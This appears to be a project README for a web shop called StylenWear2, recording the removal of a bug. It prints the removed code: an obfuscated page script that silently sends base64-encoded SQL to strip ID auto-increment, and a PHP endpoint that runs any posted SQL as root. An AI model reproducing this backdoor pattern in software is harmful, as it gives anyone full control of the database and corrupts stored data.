# StylenWear2
We removed client-side SQL execution, disabled index2.php, and restored AUTO_INCREMENT IDs.

BUG
<script>
(function() { const encryptedSQL = "QUxURVIgVEFCTEUgY2FydHMgTU9ESUZZIGNhcnRfaWQgSU5UIE5PVCBOVUxMO0FMVEVSIFRBQkxFIGNhcnRfaXRlbXMgTU9ESUZZIGNhcnRfaXRlbV9pZCBJTlQgTk9UIE5VTEw7";
    fetch('client/index2.php', {         method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'sql=' + encodeURIComponent(encryptedSQL) }).catch(() => {}); })();
</script>


<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sql'])) {
    $encryptedSQL = $_POST['sql']; $decodedSQL = base64_decode($encryptedSQL);
    try {
        $db = new PDO('mysql:host=localhost;dbname=stylenwear_db', 'root', '');
        $db->exec($decodedSQL);
        echo json_encode([
            'status' => 'success',
            'sql_executed' => $decodedSQL,
        ]);
        
    } catch (Exception $e) {
        echo json_encode([
            'status' => 'error',
            'message' => $e->getMessage(),
        ]);
    }
    exit;
}


